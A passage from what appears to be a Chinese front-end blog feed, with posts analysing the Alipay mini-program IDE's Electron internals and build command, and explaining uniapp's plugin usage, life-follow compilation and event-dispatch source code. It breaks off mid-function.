        <content type="html"><![CDATA[<blockquote><p>深入理解总是困难的，耐心和寂寞相伴，沉默和思考相随，进一退三，推着我们前进，是对未知的渴望，是残存的技术热情。</p></blockquote><p>本系列，将开始对支付宝小程序的运行时的分析，网上资料比较少，一些猜想不一定对，我姑且说之，您姑且听之。因为微信小程序的先驱性，会对两者的部分实现进行对比。</p><h2 id="ide-vs-miniu"><a href="#ide-vs-miniu" class="headerlink" title="ide vs miniu"></a>ide vs miniu</h2><p>ide 和 miniu 各有特色，各自维护了一套小程序的运行时，调试过程中两者其实都有使用到。</p><p>miniu 可以直观的看到它的构建产物，一般在 <code>.miniu/plugins/dev/dist/main</code> 目录下构建产物我们可以直接修改，再次运行。</p><p>ide 是一个正统项目，他是根据 <code>vscode</code> 修改过来的，因为 <code>vscode</code> 使用 <code>electron</code>  实现，我们可以使用 <code>electron</code> 去窥探小程序的实现。</p><h2 id="解包-vol-modules-asar"><a href="#解包-vol-modules-asar" class="headerlink" title="解包 vol_modules.asar"></a>解包 vol_modules.asar</h2><p>vol_modules.asar 路径：<code>/Applications/小程序开发者工具.app/Contents/Resources/app/vol_modules.asar</code><br><code>asar</code>是 <code>electron</code> 的编译文件，我们可以尝试对它进行反编译：</p><pre class=" language-shell"><code class="language-shell">// 安装npm install -g asar// 解包asar extract vol_modules.asar ./vol_modules/</code></pre><p>它其实是一个 node_modules 的包，内部有众多的包，后续我们主要分析 <code>lyra-integration-ide</code> 包，它的名字叫做：小程序模拟器集成。</p><h2 id="ide-开发者模式"><a href="#ide-开发者模式" class="headerlink" title="ide 开发者模式"></a>ide 开发者模式</h2><p>ide 是基于 <code>electron</code>,我们可以打开它的开发者模式：<br><img src="/images/16277299421308.jpg"></p><p>在打开的控制台中输入：<code>document.getElementsByTagName(&#39;webview&#39;)[1].openDevTools()</code></p><p>我们这里就打开了小程序渲染之后页面级别的页面。</p><h2 id="mini-pkg-builder"><a href="#mini-pkg-builder" class="headerlink" title="mini-pkg-builder"></a>mini-pkg-builder</h2><p><code>mini-pkg-builder</code>，这个程序在 miniu 和 ide 都有使用到，路径稍有不同：<br>miniu：<code>/Users/tom/.miniu/compiler/tiny6.3.0_cube0.49.18/mini-pkg-builder</code>,<br>ide: <code>/Applications/小程序开发者工具.app/Contents/Resources/app/builder/mini-pkg-builder</code></p><p>这个程序本质上是小程序的打包程序，尝试对其输入进行重定向输出：</p><pre class=" language-shell"><code class="language-shell">#!/bin/bashecho "$*" >> /Users/tom/.miniu/compiler/tiny6.3.0_cube0.49.18/mini-pkg-builder.txt</code></pre><p>拦截之后得到：</p><pre class=" language-shell"><code class="language-shell">// ide--input /Users/tom/MiniProjects/blank --output /var/folders/p1/9gklj64n229bys726brqv6040000gn/T/.miniu_dist/ng-main --zrender --prod --no-vuerender --output-code-placeholder --sourcemap false --cheap build --thread-pool-timeout 500 --cache-directory /Users/tom/MiniProjects/blank/.miniu/cache --target web --appxcompatible tiny --external appx --mode concurrent --modulize-minify process --modulize-minify-concurrent 7 --project-config-json %7B%22enableAppxNg%22%3Atrue%7D --stat-flag tag,meta --stat-output-path /var/folders/p1/9gklj64n229bys726brqv6040000gn/T/.miniu_dist/ng-main.json --webpackstats /var/folders/p1/9gklj64n229bys726brqv6040000gn/T/.miniu_dist/ng-webpack-stat.json--input /Users/tom/MiniProjects/blank --output /Users/tom/MiniProjects/blank/.miniu/plugins/dev/dist/ng-main --zrender --no-vuerender --sourcemap --cheap build --force-sourcemap --thread-pool-timeout 500 --cache-directory /Users/tom/MiniProjects/blank/.miniu/cache --target web --appxcompatible tiny --external appx --mode concurrent --modulize-minify process --modulize-minify-concurrent 7 --project-config-json %7B%22enableAppxNg%22%3Atrue%7D --watch --no-minify --output-code-placeholder --notify-flag lifecycle --notify-type ipc// miniu--input /Users/tom/MiniProjects/blank --output /Users/tom/MiniProjects/blank/.miniu/plugins/dev/dist/ng-main --zrender --no-vuerender --sourcemap --cheap build --force-sourcemap --thread-pool-timeout 500 --cache-directory /Users/tom/MiniProjects/blank/.miniu/cache --target web --appxcompatible tiny --external appx --mode concurrent --modulize-minify process --modulize-minify-concurrent 7 --project-config-json %7B%22enableAppxNg%22%3Atrue%7D --watch --no-minify --output-code-placeholder --notify-flag lifecycle --notify-type ipc</code></pre><p>这里其实就是小程序的编译命令，它本质是是多入口的 webpack 编译，常用参数 <code>sourcemap</code> ,<code>target web</code> 挺眼熟的。</p><h2 id="构建产物"><a href="#构建产物" class="headerlink" title="构建产物"></a>构建产物</h2><p>这里是单入口的页面，多入口类似，为了方便分析，我们一般会控制变量，只保留最简单的功能。<br>.<br>├── appConfig.json<br>├── assets<br>│   └── logo.png<br>├── index.html<br>├── index.js<br>├── index.worker.html<br>├── index.worker.js<br>└── manifest.json</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/81775922" target="_blank" rel="noopener">小程序底层实现原理及一些思考 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/121815358" target="_blank" rel="noopener">小程序底层实现原理及一些思考（2） - 知乎</a></li><li><a href="https://mp.weixin.qq.com/s/PX7b_qV6tYKnN3ecoz9Ehw" target="_blank" rel="noopener">独家！支付宝首次披露其小程序技术架构</a></li><li><a href="https://juejin.cn/post/6882265367251517447" target="_blank" rel="noopener">利用sourceMap定位错误实践</a></li><li><a href="http://tiaocaoer.com/xcx_study/" target="_blank" rel="noopener">微信小程序开发专区 | 薛定喵君</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重构 uniapp 项目(1)：uniapp 中的数据流机制</title>
      <link href="/2021/07/20/front-end/refactoring-deep-in-uniapp-data/"/>
      <url>/2021/07/20/front-end/refactoring-deep-in-uniapp-data/</url>
      
        <content type="html"><![CDATA[<p>  uniapp 遵循 vue 的语法，可以使用 vuex 等生态。</p><h2 id="数据操作猜想"><a href="#数据操作猜想" class="headerlink" title="数据操作猜想"></a>数据操作猜想</h2><p>vue 在 H5 中，不管引入多少概念，虚拟 dom，diff 算法，它最新依然是需要操作dom，<code>document.getElementById(&quot;p1&quot;).innerHTML = &quot;hello kitty!&quot;;</code> 类似这样的修改一定会在 vue的源码中出现。<br>小程序 js core 和 webview 的通过 <code>JSBridge</code> 进行通信，也就是 setData 这个函数。<code>JSBridge</code> 传递的是字符串，页面层，进行一次 diff 之后，渲染出数据。</p><h2 id="uniapp-setData-的调用"><a href="#uniapp-setData-的调用" class="headerlink" title="uniapp setData 的调用"></a>uniapp setData 的调用</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://uniapp.dcloud.io/component/mp-weixin-plugin" target="_blank" rel="noopener">小程序插件 - uni-app官网</a></li><li><a href="https://github.com/dcloudio/uni-app/pull/2759" target="_blank" rel="noopener">fix: 支付宝小程序 life-follow 事件去掉修饰符 by Yaob1990 · Pull Request #2759 · dcloudio/uni-app</a></li><li><a href="https://github.com/dcloudio/uni-app/commit/92d682a11a27d8fda573555512fff69a94a94e40" target="_blank" rel="noopener">fix:(mp-alipay): 支付宝小程序平台增加独有内置组件判断 #2410#issuecomment-878974559 · dcloudio/uni-app@92d682a</a></li><li><a href="https://juejin.cn/post/6968438754180595742#heading-22" target="_blank" rel="noopener">uni-app是如何构建小程序的？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重构 uniapp 项目(1)：浅浅理解 uniapp</title>
      <link href="/2021/07/20/front-end/refactoring-deep-in-uniapp/"/>
      <url>/2021/07/20/front-end/refactoring-deep-in-uniapp/</url>
      
        <content type="html"><![CDATA[<p>  uniapp 在业内名气口碑都挺不错的，选择这个框架，能够让开发者快速出活，依托 vue 的生态，相关开发者也多，企业也容易招聘。然而小程序和web毕竟还是有点区别，某些时候还是需要对uniapp 有一定的理解，才能够顺利的搬砖。本篇，我们尝试解决 uniapp 的两个问题，一窥其内在机理。</p><h2 id="uniapp-小程序插件的使用"><a href="#uniapp-小程序插件的使用" class="headerlink" title="uniapp 小程序插件的使用"></a>uniapp 小程序插件的使用</h2><p>  uniapp 论坛有不少这样的帖子，支付宝插件在子组件无法使用。<br>  官方的用法是这样：<br>    1. 引入插件代码包: 使用插件之前开发者需要在manifest.json中的各平台对应的字段内声明使用的插件，具体配置参照所用插件的开发文档</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 支付宝小程序</span>  <span class="token string">"mp-alipay"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token string">"myPlugin"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>        <span class="token string">"provider"</span><span class="token punctuation">:</span> <span class="token string">"2019235609092837"</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><ol start="2"><li><p>在页面中使用</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"pages/index/index"</span><span class="token punctuation">,</span><span class="token string">"style"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"mp-alipay"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"usingComponents"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>   <span class="token string">"hello-component"</span><span class="token punctuation">:</span> <span class="token string">"plugin://myPlugin/hello-component"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ol><p>看起来好像没啥坑，然鹅….编译之后你会发现，他在页面基本确实是引入了插件，但是组件内部并没有引入插件，于是你在组件内使用插件就报错了~</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>component<span class="token operator">></span>    <span class="token operator">&lt;</span>plugin<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>component<span class="token operator">></span></code></pre><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>解决方式倒也不复杂，既然在组件内部不给我使用插件，那么我就在组件内挖个 slot，然后在页面级别，给组件传递插件的 slot，完美解决这个问题~。</p><h2 id="uniapp-中部分标签的使用（life-follow）"><a href="#uniapp-中部分标签的使用（life-follow）" class="headerlink" title="uniapp 中部分标签的使用（life-follow）"></a>uniapp 中部分标签的使用（life-follow）</h2><p>在 uniapp 中<code>life-follow</code>无法使用。</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>life<span class="token operator">-</span>follow  a<span class="token punctuation">:</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"{{show}}"</span>  sceneId<span class="token operator">=</span><span class="token string">"****"</span>  checkFollow<span class="token operator">=</span><span class="token string">"{{checkFollow}}"</span>  onCheckFollow<span class="token operator">=</span><span class="token string">"checkFollowCb"</span>  onClose<span class="token operator">=</span><span class="token string">"closeCb"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>被编译成</p><pre><code>&lt;life-follow      vue-id=&quot;588c7fd8-1&quot;      sceneId=&quot;&quot;      checkFollow=&quot;{{checkLifeFlow}}&quot;      data-event-opts=&quot;{{[['^checkFollow',[['checkFollowCb']]],['close',[['closeCb']]]]}}&quot;      onCheckFollow=&quot;__e&quot;      onClose=&quot;__e&quot;      onVueInit=&quot;__l&quot;    &gt;&lt;/life-follow&gt;</code></pre><p>添加 $event 参数后</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>life<span class="token operator">-</span>follow  a<span class="token punctuation">:</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"{{show}}"</span>  sceneId<span class="token operator">=</span><span class="token string">"****"</span>  checkFollow<span class="token operator">=</span><span class="token string">"{{checkFollow}}"</span>  @checkFollow<span class="token operator">=</span><span class="token string">"checkFollowCb($event)"</span>  @close<span class="token operator">=</span><span class="token string">"closeCb($event)"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>编译为：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>life<span class="token operator">-</span>follow      vue<span class="token operator">-</span>id<span class="token operator">=</span><span class="token string">"588c7fd8-1"</span>      sceneId<span class="token operator">=</span><span class="token string">"***"</span>      checkFollow<span class="token operator">=</span><span class="token string">"{{checkLifeFlow}}"</span>      data<span class="token operator">-</span>event<span class="token operator">-</span>opts<span class="token operator">=</span><span class="token string">"{{[['^checkFollow',[['checkFollowCb',['$event']]]],['close',[['closeCb',['$event']]]]]}}"</span>      onCheckFollow<span class="token operator">=</span><span class="token string">"__e"</span>      onClose<span class="token operator">=</span><span class="token string">"__e"</span>      onVueInit<span class="token operator">=</span><span class="token string">"__l"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>life<span class="token operator">-</span>follow<span class="token operator">></span></code></pre><p>为了区分自定义事件，uniapp, 添加 ^ 前缀，目前 uniapp 没有对 tag 进行区分，这部分最终走向了自定义事件，实际小程序中这里 js 报错。</p><h3 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="解决办法"></a>解决办法</h3><p>方法一：<br>使用小程序原生组件（非 uni 组件，mycomponents 这个目录下的小程序原生自定义组件），代码直接使用小程序原生的，不走 uniapp 的转换，规避这个问题。</p><p>方法二：<br>uniapp 给小程序特定标签加黑名单，这里不做自定义处理。我提了mr，官方觉得位置不好，换了个地方去写了：），好消息是你现在再用uniapp去新建一个项目，<code>life-follow</code>应该已经可以正常使用啦~</p><h2 id="uniapp-debugger模式"><a href="#uniapp-debugger模式" class="headerlink" title="uniapp debugger模式"></a>uniapp debugger模式</h2><p>在项目根目录新建 <code>.env</code> 文件,输入下面内容，即可开启 uniapp 的 DEBUG 模式，从控制台能看到不少有意思的东西。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// .env</span>VUE_APP_DEBUG<span class="token operator">=</span><span class="token boolean">true</span></code></pre><h2 id="uniapp-的编译"><a href="#uniapp-的编译" class="headerlink" title="uniapp 的编译"></a>uniapp 的编译</h2><p>@dcloudio/uni-template-compiler：uniapp 模板编译器，事件等处理都是在这里编译<br>@dcloudio/uni-mp-alipay：uniapp 平台运行时，平台相关的处理，事件函数的处理，一般都在这个文件中。</p><h2 id="uniapp-事件系统"><a href="#uniapp-事件系统" class="headerlink" title="uniapp 事件系统"></a>uniapp 事件系统</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>会被编译成：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">data-event-opts</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{[[<span class="token punctuation">'</span>tap<span class="token punctuation">'</span>,[[<span class="token punctuation">'</span>query<span class="token punctuation">'</span>,[<span class="token punctuation">'</span>$event<span class="token punctuation">'</span>]]]]]}}<span class="token punctuation">"</span></span>    <span class="token attr-name">onTap</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>__e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>多个事件元素，它的<code>onTap</code>都是 <code>__e</code>，我们猜测，<code>__e</code>是 <code>uniapp</code> 事件系统的管理分发的角色，通过 <code>query</code>，找到调用者，参数是<code>$event</code></p><h3 id="编译事件代码分析"><a href="#编译事件代码分析" class="headerlink" title="编译事件代码分析"></a>编译事件代码分析</h3><p>在解析模板之后，拿到相关事件，对once、capture等事件，添加特定前缀。事件处理，统一添加 <code>__e</code> 方法。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">_processEvent</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> state<span class="token punctuation">,</span> isComponent<span class="token punctuation">,</span> isNativeOn <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> tagName<span class="token punctuation">,</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> opts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// remove invalid event</span>    path<span class="token punctuation">.</span>node<span class="token punctuation">.</span>value<span class="token punctuation">.</span>properties <span class="token operator">=</span> path<span class="token punctuation">.</span>node<span class="token punctuation">.</span>value<span class="token punctuation">.</span>properties<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>property <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> property<span class="token punctuation">.</span>key<span class="token punctuation">.</span>value <span class="token operator">||</span> property<span class="token punctuation">.</span>key<span class="token punctuation">.</span>name    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> len <span class="token operator">=</span> path<span class="token punctuation">.</span>node<span class="token punctuation">.</span>value<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>length    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//  .... 省略</span>        <span class="token keyword">const</span> getEventType <span class="token operator">=</span> state<span class="token punctuation">.</span>options<span class="token punctuation">.</span>platform<span class="token punctuation">.</span>getEventType        <span class="token keyword">let</span> optType <span class="token operator">=</span> isCustom <span class="token operator">?</span> <span class="token function">customize</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">getEventType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 比如自定义组件使用了 click 自定义事件</span>        <span class="token comment" spellcheck="true">//  添加前缀</span>        <span class="token comment" spellcheck="true">// VUE_EVENT_MODIFIERS: {</span>        <span class="token comment" spellcheck="true">//         capture: '!',</span>        <span class="token comment" spellcheck="true">//         once: '~',</span>        <span class="token comment" spellcheck="true">//         passive: '&amp;',</span>        <span class="token comment" spellcheck="true">//         custom: '^'</span>        <span class="token comment" spellcheck="true">// },</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>isOnce<span class="token punctuation">)</span> <span class="token punctuation">{</span>            optType <span class="token operator">=</span> VUE_EVENT_MODIFIERS<span class="token punctuation">.</span>once <span class="token operator">+</span> optType        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>isCustom<span class="token punctuation">)</span> <span class="token punctuation">{</span>            optType <span class="token operator">=</span> VUE_EVENT_MODIFIERS<span class="token punctuation">.</span>custom <span class="token operator">+</span> optType        <span class="token punctuation">}</span>        opts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            opt<span class="token punctuation">:</span> t<span class="token punctuation">.</span><span class="token function">arrayExpression</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                t<span class="token punctuation">.</span><span class="token function">stringLiteral</span><span class="token punctuation">(</span>optType<span class="token punctuation">)</span><span class="token punctuation">,</span>                t<span class="token punctuation">.</span><span class="token function">arrayExpression</span><span class="token punctuation">(</span>methods<span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            params        <span class="token punctuation">}</span><span class="token punctuation">)</span>        keyPath<span class="token punctuation">.</span><span class="token function">replaceWith</span><span class="token punctuation">(</span>            t<span class="token punctuation">.</span><span class="token function">stringLiteral</span><span class="token punctuation">(</span>                state<span class="token punctuation">.</span>options<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">formatEventType</span><span class="token punctuation">(</span>                    isCustom <span class="token operator">?</span> <span class="token function">customize</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">getEventType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 比如自定义组件使用了 click 自定义事件</span>                    isCatch<span class="token punctuation">,</span>                    isCapture<span class="token punctuation">,</span>                    isCustom                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// INTERNAL_EVENT_PROXY === '__e' ,这里添加了 事件处理函数，'__e'</span>        valuePath<span class="token punctuation">.</span><span class="token function">replaceWith</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">stringLiteral</span><span class="token punctuation">(</span>INTERNAL_EVENT_PROXY<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> opts<span class="token punctuation">}</span></code></pre><h3 id="事件调用代码分析"><a href="#事件调用代码分析" class="headerlink" title="事件调用代码分析"></a>事件调用代码分析</h3><p>在页面初始化的时候，调用 parsePage，进行了事件绑定，<code>__e</code>指向了<code>handleEvent</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> parsePage <span class="token punctuation">(</span>vuePageOptions<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>VueComponent<span class="token punctuation">,</span> vueOptions<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">initVueComponent</span><span class="token punctuation">(</span>Vue<span class="token punctuation">,</span> vuePageOptions<span class="token punctuation">)</span>  <span class="token keyword">const</span> pageOptions <span class="token operator">=</span> <span class="token punctuation">{</span>    mixins<span class="token punctuation">:</span> <span class="token function">initBehaviors</span><span class="token punctuation">(</span>vueOptions<span class="token punctuation">)</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> <span class="token function">initData</span><span class="token punctuation">(</span>vueOptions<span class="token punctuation">,</span> Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>    onLoad <span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> properties <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props      <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>        mpType<span class="token punctuation">:</span> <span class="token string">'page'</span><span class="token punctuation">,</span>        mpInstance<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">,</span>        propsData<span class="token punctuation">:</span> properties      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 初始化 vue 实例</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueComponent</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span>      <span class="token function">initSpecialMethods</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 触发首次 setData</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> copyQuery <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>      <span class="token keyword">delete</span> copyQuery<span class="token punctuation">.</span>__id__      <span class="token keyword">this</span><span class="token punctuation">.</span>$page <span class="token operator">=</span> <span class="token punctuation">{</span>        fullPath<span class="token punctuation">:</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>route <span class="token operator">+</span> <span class="token function">stringifyQuery</span><span class="token punctuation">(</span>copyQuery<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> query      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span>$mp<span class="token punctuation">.</span>query <span class="token operator">=</span> query <span class="token comment" spellcheck="true">// 兼容 mpvue</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">__call_hook</span><span class="token punctuation">(</span><span class="token string">'onLoad'</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    onReady <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">initChildVues</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span>_isMounted <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">__call_hook</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">__call_hook</span><span class="token punctuation">(</span><span class="token string">'onReady'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    onUnload <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">__call_hook</span><span class="token punctuation">(</span><span class="token string">'onUnload'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">$destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    events<span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 支付宝小程序有些页面事件只能放在events下</span>      onBack <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">.</span><span class="token function">__call_hook</span><span class="token punctuation">(</span><span class="token string">'onBackPress'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    __r<span class="token punctuation">:</span> handleRef<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 绑定事件</span>    __e<span class="token punctuation">:</span> handleEvent<span class="token punctuation">,</span>    __l<span class="token punctuation">:</span> handleLink$<span class="token number">1</span><span class="token punctuation">,</span>    triggerEvent  <span class="token punctuation">}</span>  <span class="token function">initHooks</span><span class="token punctuation">(</span>pageOptions<span class="token punctuation">,</span> hooks$<span class="token number">1</span><span class="token punctuation">,</span> vuePageOptions<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>vueOptions<span class="token punctuation">.</span>wxsCallMethods<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    vueOptions<span class="token punctuation">.</span>wxsCallMethods<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>callMethod <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      pageOptions<span class="token punctuation">[</span>callMethod<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">[</span>callMethod<span class="token punctuation">]</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> pageOptions<span class="token punctuation">}</span></code></pre><p>handleEvent 方法：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> handleEvent <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  event <span class="token operator">=</span> <span class="token function">wrapper$1</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// [['tap',[['handle',[1,2,a]],['handle1',[1,2,a]]]]]</span>  <span class="token keyword">const</span> dataset <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>currentTarget <span class="token operator">||</span> event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>dataset  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dataset<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'事件信息不存在'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">const</span> eventOpts <span class="token operator">=</span> dataset<span class="token punctuation">.</span>eventOpts <span class="token operator">||</span> dataset<span class="token punctuation">[</span><span class="token string">'event-opts'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// 支付宝 web-view 组件 dataset 非驼峰</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>eventOpts<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'事件信息不存在'</span><span class="token punctuation">)</span> 